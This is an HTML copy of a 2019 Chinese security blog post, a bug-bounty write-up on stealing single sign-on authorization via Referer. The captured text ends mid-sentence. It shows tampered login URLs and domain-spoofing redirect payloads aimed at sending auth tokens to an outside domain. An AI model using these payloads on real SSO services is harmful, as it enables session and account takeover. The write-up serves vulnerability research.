<html>
<head>
<title>漏洞挖掘单点登录的网站通过Referer盗取用户授权</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
漏洞挖掘 | 单点登录的网站通过Referer盗取用户授权
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    tdaro
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-12-04</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io">最近参加了一个赏金计划，然后在单点登录中发现了一个涉及比较多站点的漏洞，测试过程比较有意思，所以分享一下。</p><h4 style="font-weight: 600;line-height: 1.7;font-size: 1.25rem;margin-top: 0.625rem;margin-bottom: 0.5rem;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>基础解答：</strong></h4><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">一般我们在挖洞的时候，很关键的就是要观察数据流，你可以选择用burp，当然也可以使用浏览器的F12(俗称浏览器F12大法)来观察数据流向。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">以下将用户中心登录站点称为passport.AAA.com，用户在登陆<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">*.AAA.com</code>的时候可以选择先登录<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">passport.AAA.com</code>，然后它会返回授权，接着用户就能登录<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">*.AAA.com</code>了。</p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-backh="206" data-backw="469" data-before-oversubscription-url="https://mmbiz.qlogo.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPjoKAqmZoljvUkoRrorKdS9ZqU7LhAI7xULAkfAWSkdC2tbLShcPYjQ/0?wx_fmt=png" data-ratio="0.43923240938166314" data-s="300,640" src="图片/HACK学习呀_2019-12-04_漏洞挖掘单点登录的网站通过Referer盗取用户授权/1_U7LhAI7xULAkfAWSkdC2tbLShcPYjQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8Z6WQkQNmNaOADu3icNdhGPjoKAqmZoljvUkoRrorKdS9ZqU7LhAI7xULAkfAWSkdC2tbLShcPYjQ/640?wx_fmt=png'" data-type="png" data-w="469" style="width: 100%;height: auto;"  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">当然我一般都是先登录了，然后再去点击这个链接，接着默默观察浏览器都请求了啥玩意。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">你可以发现其中的一个请求长成下面这个样子：</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://subdomain.AAA.com/SSOServerLogin&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后会跳转到</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">http://subdomain.AAA.com/SSOServerLogin?auth=xxxx&amp;isiframe=1&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">那么理所当然的，这里有几个参数我们肯定是要改一改看看服务器怎么响应了：<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>、<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">isiframe</code>、<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">service</code>、<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>、<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">CSSStyle</code>。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从上面的链接我们可以看到最后授权是返回给了continue指定的值，于是我把continue参数的值改为<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com</code>，然后访问</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://www.baidu.com&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f737562646f6d61696e2e4141412e636f6d2f&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">很遗憾，并不能马上成功</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">说明人家还是校验了域名的，于是接下来就要想办法正面刚一下，看看服务器是不是真的很好的校验了该域名！</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">将continue的值设置为<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com@AAA.com</code>,&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://AAA.com.www.baidu.com</code>等欺骗域名均告失败，当设置为<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com#@AAA.com</code>可以截断变成<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com</code>，但是后端还是通不过，说明continue这个值没有办法指向任意域名。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">接下来把<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>值设置为<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://*.AAA.com</code>发现是成功的，说明这里的校验应该是限制为了AAA.com下的任意子域名(后面测试发现其实还有一些白名单域名，比如BBB.com等)。既然是这样子，那continue参数先放着，再看看其他值。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">isiframe</code>这种要么1要么0，改完也没发现什么变化，跳过。&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">CSSStyle</code>这个参数，从名字上来看应该是加载指定的css，于是可以猜想，假如成功控制了这里的值，那么是不是可以造成加载外域css然后导致xss，或者在请求该css时会泄露一些数据。经过测试之后，这个参数值并没有起作用，假的！&nbsp;<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">service</code>指定的是站点的标识。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">最后说到<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>这个参数，一看他的值就知道是经过编码或者加密的，那么有两种情况，在本地进行加密/编码，反之在服务端。如果在服务端，那就束手无策了，除非你天赋异禀直接给猜解出来。那如果是在客户端，找到加密/编码函数，这个参数也能为你所用了。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在浏览器中刷新了一下请求，然后去关注一下所有加载的js脚本，我是通过以location为关键字搜到了该编码函数，函数只是简单的将参数进行编码。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">来测试<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>参数的值，一样的步骤，只是这里再加了一次编码而已。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">于是将<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">http://www.baidu.com/</code>编码一下赋值给<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">location</code>，访问</p><pre class="highlight" style="overflow: auto;font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(82, 82, 82);background-color: rgb(248, 248, 248);padding: 1em;line-height: 1.3875;word-break: break-all;border-radius: 0px;"><code style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;background: transparent;border-radius: 2px;overflow: auto;overflow-wrap: normal;">https://passport.AAA.com/sso/accounts/serviceLogin?continue=http://subdomain.AAA.com/SSOServerLogin&amp;isiframe=1&amp;service=service_id&amp;location=687474703a2f2f7777772e62616964752e636f6d&amp;CSSStyle=https://static.xxx.AAA.com/sso/subdomain/style/login_t_cover160316.css<br  /></code></pre><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">显示</p><p style="text-align: center;"><br  /></p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">还是有校验，而且因为校验失败，还要重新登<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">https://passport.AAA.com/</code>最后发现这里的校验和<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: rgb(233, 105, 0);background-color: rgb(248, 248, 248);border-radius: 2px;white-space: nowrap;">continue</code>参数情况一模一样。</p><p style="transition: all 0.1s ease 0s;margin-top: 1.2em;margin-bottom: 1.2em;word-spacing: 0.05em;line-height: 1.6em;color: rgba(0, 0, 0, 0.87);font family: &quot;Source Sans Pro&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">到现在这种情况，正面刚域名欺骗已经不可能了。回过头来，我们刚刚测试有发现<code class="language-plaintext highlighter-rouge" style="font family: &quot;Roboto Mono&quot;, &quot;Courier New&quot;, monospace;font-size:12px;line-height:32px;;color: 